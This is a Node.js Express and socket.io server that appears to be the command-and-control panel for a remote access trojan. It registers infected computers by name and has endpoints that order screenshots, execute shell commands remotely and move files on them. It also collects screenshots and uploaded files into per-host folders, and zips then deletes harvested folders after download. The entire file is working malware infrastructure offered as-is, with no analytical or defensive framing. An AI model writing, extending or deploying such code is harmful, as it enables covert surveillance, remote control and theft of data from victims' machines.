const express = require('express');
const http = require('http');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');
const archiver = require('archiver');

const fileUpload = require('express-fileupload');


// Enable file uploads


const app = express();  // Create an instance of express

// Create the HTTP server using the express app
const server = http.createServer(app);
const io = require('socket.io')(
  server,{
    maxHttpBufferSize: 1e7
  }
);

app.use(bodyParser.json());
app.set('view engine', 'ejs');
app.set('views', path.resolve('./views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(fileUpload());

const myStore={};
const mySockets={};
var list=[];

var img="";
var result = "";
var resultdu = "";
var save=1;

io.on('connection', function(socket){
	console.log('Connected');
 
  io.to(socket.id).emit('asksysi');
  
  
	socket.on('sstkn', (data) => {
        try {
          // Extract the base64-encoded image from the data
          const base64Image = data;
      
          // Decode the base64 image
          const imageBuffer = Buffer.from(base64Image, 'base64');
      
          const currentDate = new Date();
          const formattedDate = currentDate.toISOString().replace(/:/g, '-').split('.')[0]; // Format as "YYYY-MM-DDTHH-mm-ss"
          var fileName;
          if (save==1) {
            fileName = `/${mySockets[socket.id]}/${formattedDate}_socket_${mySockets[socket.id]}.png`;
          }
          else{
            fileName = `/temp.png`;
            save=1;
          }
          
          
          img = fileName;
          const filePath = path.join(__dirname, '/public'+fileName);

          try {
            fs.writeFileSync(filePath, imageBuffer);
          } catch (error) {
            Makedir(mySockets[socket.id])
            fs.writeFileSync(filePath, imageBuffer);
          }
          
          console.log('Image saved successfully at:', filePath);
        } catch (error) {
          console.error('Error saving image:', error);
        }
      });

  socket.on('sysi', function(data){
		myStore[data]={id:socket.id,connected:true,lastonline:null};
    mySockets[socket.id]=data;//data is computer name
    console.log("Got New Socket Info");
	})

  socket.on('excm', function(data){
    console.log("Got Ex Result");
    result = data;
	})

  socket.on('du', function(data){
    console.log("Got Du Result");
    resultdu = data;
	})


	socket.on('disconnect', function(msg){
		console.log('Disconnected');
    try {
      if (myStore.hasOwnProperty(mySockets[socket.id])===true){
        myStore[mySockets[socket.id]].connected=false;
        myStore[mySockets[socket.id]].lastonline=new Date().toString();
      }
      delete mySockets[socket.id]
    } catch (error) {
      console.log(error);
    }
        
	})
});

app.get('/', async function (req, res) {
  const targetPath = 'public/';
  listDirectories(targetPath)
    .then((directories) => {
      list=directories;
    })
    .catch((error) => {
      console.error('Error:', error);
    });
    
    res.render('home', { data:myStore,img:img,list:list });
   
});

app.get('/person/:name', (req, res) => {
  const name = req.params.name;
  res.render('name', { name:name, result:result, resultdu:resultdu});
});

app.post('/owl', (req, res) => {
    save=req.body.save;
    console.log("Take SS",req.body.Id)
    if(mySockets[req.body.Id]){
      io.to(req.body.Id).emit('tkss', {data:req.body.Id});
      return res.json({ success: true });
    }
    else{
      return res.json({ success: false });
    }

});

app.post('/owl2', (req, res) => {
  console.log("Execute Command Sent",req.body.nd,req.body.dir,req.body.com)
  if(mySockets[myStore[req.body.nd].id]){
    io.to(myStore[req.body.nd].id).emit('excm', {dir:req.body.dir,com:req.body.com});
  }
   
});

app.post('/owl3', (req, res) => {
  console.log("Execute DU",req.body.destination,req.body.source,req.body.nd,req.body.du)
  if(mySockets[myStore[req.body.nd].id]){
    io.to(myStore[req.body.nd].id).emit('du', {des:req.body.destination,sou:req.body.source,du:req.body.du});
  }
   
});

app.post('/upload', (req, res) => {
  const hostname = req.body.hostname;
  if (!req.files || Object.keys(req.files).length === 0) {
      return res.status(400).send('No files were uploaded.');
  }

  const uploadedFile = req.files.file;
  const uploadPath = path.join(__dirname, 'public',hostname, uploadedFile.name);
  
  const directoryPath = path.dirname(uploadPath);
    if (!fs.existsSync(directoryPath)) {
        fs.mkdirSync(directoryPath, { recursive: true });
    }

  uploadedFile.mv(uploadPath, (err) => {
      if (err) {
          console.log("Error File Upload");
          return res.status(500).send(err);
      }

      res.send('File uploaded!');
  });
});



app.post('/directory', (req, res) => {
  const folderPath = path.join(__dirname, "public/"+req.body.directory);
  const outputFilePath = path.join(__dirname, 'archive.zip');

  zipFolder(folderPath, outputFilePath, (err) => {
    if (err) {
      res.status(500).send('Error creating zip file');
    } else {
      // Delete the zip file after download
      
      res.download(outputFilePath, 'archive.zip', (err) => {
        if (err) {
          res.status(500).send('Error downloading zip file');
        }
        fs.unlink(outputFilePath, (err) => {
          if (err) {
            console.error('Error deleting zip file:', err);
          }
        });
        fs.rm(folderPath, { recursive: true }, (err) => {
          if (err) {
            console.error(`Error deleting folder: ${err.message}`);
          } else {
            console.log(`Folder '${folderPath}' deleted successfully.`);
          }
        });
        
      });
    }
  });
  //res.redirect('/');
});


const port = 3000;
server.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});


function Makedir(directoryPath) {
  console.log("Yo");
  fs.mkdirSync('public/'+directoryPath, { recursive: true }, (err) => {
    if (err) {
      console.error('Error creating directory:', err);
    } else {
      console.log('Directory created successfully.');
    }
  });
}

async function listDirectories(targetPath) {
  try {
    const files = fs.readdirSync(targetPath);
  
    const directories = files.filter((file) => {
      const filePath = path.join(targetPath, file);
      return fs.statSync(filePath).isDirectory();
    })
     list=directories;
  }
    catch (error) {
    console.error('Error listing directories:', error);
    return [];
  }
}

function zipFolder(folderPath, outputFilePath, callback) {
  const archive = archiver('zip', { zlib: { level: 9 } });

  const output = fs.createWriteStream(outputFilePath);

  archive.pipe(output);

  archive.directory(folderPath, false);

  archive.finalize();

  output.on('close', () => {
    callback(null);
  });

  archive.on('error', (err) => {
    callback(err);
  });
}

